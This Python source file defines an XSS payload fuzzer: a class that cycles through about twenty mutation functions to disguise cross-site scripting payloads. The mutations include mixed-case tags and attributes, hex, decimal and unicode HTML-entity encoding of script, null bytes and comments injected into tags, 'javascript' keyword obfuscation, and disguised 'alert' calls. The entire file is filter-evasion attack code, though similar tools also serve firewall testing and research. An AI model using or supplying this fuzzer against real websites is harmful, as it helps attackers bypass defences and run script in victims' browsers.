import re
import random
import base64
import string
from bs4 import BeautifulSoup


def is_html_or_javascript(text):
    """判断文本是否是HTML或JavaScript代码。"""

    # 正则表达式检测HTML标签，如 <tag> 或 </tag> 或 <tag/>
    html_pattern = re.compile(r'<\/?\w+[^>]*>')

    # 正则表达式检测JavaScript特征，如关键字 function, var, let, const; 以及 { ... } 结构
    js_pattern = re.compile(r'\b(function|var|let|const)\b|{\s*}|;\s*$')

    # 检测是否包含HTML标签
    if html_pattern.search(text):
        return True

    # 检测是否包含JavaScript特征
    if js_pattern.search(text):
        return True

    return False


def add_control_to_javascript(code):
    """A1: 在 'javascript' 前添加 '`&#14;`'"""
    return re.sub(r'\bjavascript\b', '`&#14;`javascript', code, flags=re.IGNORECASE)


def mix_case_html_attributes(code):
    """A2: 混合大小写的 HTML 属性"""

    def randomize_case(match):
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for i, c in enumerate(match.group()))

    return re.sub(r'\b(href|src|id|class|style)\b', randomize_case, code, flags=re.IGNORECASE)


def replace_spaces_in_code(code):
    """Replace spaces in HTML or JavaScript code outside of strings and comments with a random choice of '/', '%0A', or '%0D'."""
    choices = ['/', '%0A', '%0D']

    # Regex to match strings, comments and anything else
    pattern = r'''
        ("(?:\\.|[^"\\])*") |       # Double quoted strings
        ('(?:\\.|[^'\\])*') |       # Single quoted strings
        (/\*.*?\*/|//.*?$) |        # Multi-line and single-line comments
        (\s)                        # Spaces to replace
    '''

    def replace(match):
        # If space is matched, replace it with a random choice
        if match.group(4):
            return random.choice(choices)
        # Otherwise, return the match as is (strings and comments are preserved)
        else:
            return match.group(0)

    # Perform the replacement
    return re.sub(pattern, replace, code, flags=re.MULTILINE | re.DOTALL | re.VERBOSE)


def mix_case_html_tags(code):
    """A4: 混合大小写的 HTML 标签"""
    return re.sub(r'</?(\w+)',
                  lambda m: ''.join(c.upper() if random.random() > 0.5 else c.lower() for i, c in enumerate(m.group())),
                  code)


def remove_single_tag_closing(code):
    """A5: 移除单标签的关闭符号"""
    return re.sub(r'<(img|br|hr|input)([^>]*?)/>', r'<\1\2>', code, flags=re.IGNORECASE)


def encode_js_to_html_entities(html_content):
    """A8: HTML实体编码为JS代码（十六进制）"""

    def encode_js(match):
        # Encode JavaScript found within <script> tags, inline JavaScript, or JavaScript URIs
        js_code = match.group(1)  # Extracting the actual JavaScript code from regex match
        return ''.join(f'&#{ord(c):x};' for c in js_code)

    # Pattern to find JavaScript within <script> tags
    script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)

    # Pattern to find inline JavaScript (captures contents after event handler attributes and javascript: URIs)
    inline_js_pattern = re.compile(r'(on\w+=")([^"]+)"|(javascript:)([^"]+)', re.IGNORECASE)

    # First, encode JavaScript within <script> tags
    encoded_html = script_pattern.sub(lambda m: f'<script>{encode_js(m)}</script>', html_content)

    # Second, encode inline JavaScript in HTML attributes
    encoded_html = inline_js_pattern.sub(encode_js, encoded_html)

    return "#API_"+encoded_html


def double_html_tags(code):
    """A9: 双写HTML标签"""
    return re.sub(r'(</?[^>]+>)', r'\1\1', code)


def replace_http_with_protocol_relative(code):
    """A10: 用 '//' 替换 'http://'"""
    return code.replace('http://', '//')


def html_entity_encode_decimal(html_content):
    """Encode only JavaScript portions of an HTML document using decimal HTML entities."""

    def encode_js(match):
        # Encode JavaScript found within <script> tags, inline JavaScript, or JavaScript URIs
        js_code = match.group(1)  # Extracting the actual JavaScript code from regex match
        return ''.join(f'&#{ord(c)};' for c in js_code)

    # Pattern to find JavaScript within <script> tags
    script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)

    # Pattern to find inline JavaScript (captures contents after event handler attributes and javascript: URIs)
    inline_js_pattern = re.compile(r'(on\w+=")([^"]+)"|(javascript:)([^"]+)', re.IGNORECASE)

    # First, encode JavaScript within <script> tags
    encoded_html = script_pattern.sub(lambda m: f'<script>{encode_js(m)}</script>', html_content)

    # Second, encode inline JavaScript in HTML attributes
    encoded_html = inline_js_pattern.sub(encode_js, encoded_html)

    return "#API_"+encoded_html


def modify_javascript_randomly(html_input):
    """A7: 添加 '%*09' 到 'javascript'
    A6: 添加 '%NewLine;' 到 'javascript'
    A12: Add "&colon;" to "javascript"
    A13: Add "&Tab;" to "javascript" """
    entities = ["&colon;", "&Tab;", "&#x09;", "&NewLine;"]

    def replace_func(match):
        # 选择一个随机的字符实体
        random_entity = random.choice(entities)
        # 生成0到9的随机位置（"javascript"的长度为10）
        position = random.randint(0, len("javascript"))
        # 插入字符实体
        return match.group(0)[:position] + random_entity + match.group(0)[position:]

    # 使用正则表达式替换函数
    modified_html = re.sub(r'javascript', replace_func, html_input, flags=re.IGNORECASE)
    return modified_html


def transform_alert(js_code):
    # Define the three transformation options for the "alert" keyword
    transformations = [
        "top['al'+'ert'](1)",
        "top[8680439..toString(30)](1)",
        "top[/al/.source+/ert/.source](1)"
    ]

    # Randomly choose one of the transformations
    transformation = random.choice(transformations)

    # Replace "alert" with the chosen transformation
    transformed_code = js_code.replace("alert", transformation)

    return transformed_code


def add_d_r_v_after_script_tag(js_code):
    """A14: Add string "/d/r/v" after the script tag"""
    return js_code.replace("</script>", "</script>/d/r/v")


def replace_parentheses_with_grave(js_code):
    """A15: Replace "(" and ")" with grave note"""
    return js_code.replace("(", "`").replace(")", "`")


# def encode_data_protocol_with_base64(html_content):
#     def encode_content_to_base64(content, mime_type):
#         """将给定内容编码为Base64字符串，并附上MIME类型前缀。"""
#         base64_encoded = base64.b64encode(content.encode()).decode('utf-8')
#         return f"data:{mime_type};base64,{base64_encoded}"

#     """A16: Encode data protocol with Base64"""
#     """处理HTML内容，转换所有适合的资源为Base64编码。"""
#     soup = BeautifulSoup(html_content, 'html.parser')

#     # 处理内联图像
#     for img in soup.find_all('img'):
#         src = img.get('src')
#         if src.startswith('data:'):  # 检查是否已是Base64编码
#             continue
#         mime_type = 'image/jpeg'  # 假设图像为JPEG，实际使用时应根据情况确定
#         img['src'] = encode_content_to_base64(src, mime_type)

#     # 处理CSS背景图像
#     for element in soup.find_all(style=True):
#         css_text = element['style']
#         urls = re.findall(r'url\((.*?)\)', css_text)
#         for url in urls:
#             new_url = encode_content_to_base64(url.strip("'\""), 'image/jpeg')  # 假设背景图像为JPEG
#             css_text = css_text.replace(url, new_url)
#         element['style'] = css_text

#     return "#API_"+str(soup)


def remove_quotation_marks(js_code):
    """A17: Remove the quotation marks"""
    return js_code.replace('"', '').replace("'", "")


def unicode_encode_js_code(html_content):
    """A18: Unicode encoding for JS code"""

    def encode_js(match):
        # Encode JavaScript found within <script> tags, inline JavaScript, or JavaScript URIs
        js_code = match.group(1)  # Extracting the actual JavaScript code from regex match
        return ''.join(f'&#x{ord(c):04x};' for c in js_code)

    # Pattern to find JavaScript within <script> tags
    script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)

    # Pattern to find inline JavaScript (captures contents after event handler attributes and javascript: URIs)
    inline_js_pattern = re.compile(r'(on\w+=")([^"]+)"|(javascript:)([^"]+)', re.IGNORECASE)

    # First, encode JavaScript within <script> tags
    encoded_html = script_pattern.sub(lambda m: f'<script>{encode_js(m)}</script>', html_content)

    # Second, encode inline JavaScript in HTML attributes
    encoded_html = inline_js_pattern.sub(encode_js, encoded_html)

    return "#API_" + encoded_html


def html_entity_encode_javascript(js_code):
    """A19: HTML entity encoding for "javascript" """
    return js_code.replace("javascript", "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;")


# 存疑
def replace_lessthan_of_single_tag(js_code):
    """A20: Replace "<" of single label with ">" """
    return js_code.replace("<", ">")  # Be careful with this; it can invalidate your HTML


def add_interference_string(js_code):
    def generate_random_string():
        # Generate a random length between 1 and 10
        length = random.randint(1, 10)

        # Create a random string of that length
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    interference = generate_random_string()
    """A23: Add an interference string before the example."""
    return f"{interference} {js_code}"


def add_comment_into_tags(html_code):
    """Insert a random comment at a random position within randomly selected HTML tags."""

    def random_string(length=10):
        """Generate a random alphanumeric string of fixed length."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def insert_comment(tag):
        """Insert a random comment at a random position in the tag."""
        comment = f"<!--{random_string()}-->"
        pos = random.randint(1, len(tag) - 1)  # Choose a random position within the tag to insert the comment
        return tag[:pos] + comment + tag[pos:]

    # Find all tags
    tags = re.findall(r'<[^>]+>', html_code)

    # Randomly decide which tags to modify (e.g., about half of them)
    chosen_tags = random.sample(tags, len(tags) // 2)

    # Replace chosen tags in the original HTML code with their commented versions
    modified_html = html_code
    for tag in chosen_tags:
        modified_tag = insert_comment(tag)
        modified_html = modified_html.replace(tag, modified_tag, 1)

    return modified_html


def replace_javascript_with_vbscript(js_code):
    """A25: "vbscript" replaces "javascript"."""
    return js_code.replace("javascript", "vbscript")


def inject_empty_byte_into_tags(html_code):
    """Inject empty byte '%00' at a random position within randomly selected HTML tags."""

    def random_insert(tag):
        # Choose a random position in the tag after the first character (to avoid syntax errors)
        pos = random.randint(1, len(tag) - 1)
        # Return the tag with '%00' inserted at the random position
        return tag[:pos] + '%00' + tag[pos:]

    # Find all tags
    tags = re.findall(r'<[^>]+>', html_code)

    # Randomly decide which tags to modify
    # Here we choose to modify approximately half of the tags
    chosen_tags = random.sample(tags, len(tags) // 2)

    # Replace chosen tags in the original HTML code
    modified_html = html_code
    for tag in chosen_tags:
        modified_tag = random_insert(tag)
        modified_html = modified_html.replace(tag, modified_tag, 1)

    return modified_html


class XssFuzzer:
    def __init__(self, payload):
        self.payload = payload
        self.initial_payload = payload
        self.strategies = [add_control_to_javascript, mix_case_html_attributes, replace_spaces_in_code,
                           mix_case_html_tags,
                           remove_single_tag_closing, encode_js_to_html_entities, modify_javascript_randomly,
                           double_html_tags, replace_http_with_protocol_relative, html_entity_encode_decimal,
                           add_d_r_v_after_script_tag, replace_parentheses_with_grave,
                           remove_quotation_marks, unicode_encode_js_code,
                           html_entity_encode_javascript, transform_alert,
                           add_interference_string,
                           add_comment_into_tags,
                           inject_empty_byte_into_tags,
                           ]

    def fuzz(self, position):
        try:
            if self.payload is None or (not is_html_or_javascript(self.payload)):
                return -1
            self.payload = self.strategies[position](self.payload)
        except:
            print("error")
            self.payload = self.payload

    def current(self):
        return self.payload

    def update(self):
        self.initial_payload = self.payload

    def reset(self):
        self.payload = self.initial_payload
        return self.payload


# if __name__ == "__main__":
#     # 示例代码使用
#     example_code = '''
#     <script type="text/javascript">
#         var url = "http://example.com";
#         alert('Hello, world!');
#     </script>
#     <a href="http://www.example.com" class="link">Visit</a>
#     <br/>
#     <img src="http://www.example.com/image.jpg"/>
#     '''
#     # xf = XssFuzzer(example_code)
#     for i in range(22):
#         xf = XssFuzzer(example_code)
#         xf.fuzz(i)
#         print(xf.payload)

